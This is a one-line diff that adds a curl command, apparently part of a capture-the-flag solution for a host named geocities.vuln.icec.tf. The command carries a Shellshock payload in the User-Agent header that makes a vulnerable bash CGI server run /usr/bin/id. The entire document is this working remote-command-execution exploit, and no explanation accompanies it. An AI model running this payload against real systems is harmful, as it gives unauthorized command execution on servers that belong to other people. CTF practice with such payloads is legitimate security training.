@@ -1,0 +1,1 @@
+curl -A "() { :; }; echo 'Content-type: text/html'; echo; /usr/bin/id;" http://geocities.vuln.icec.tf/
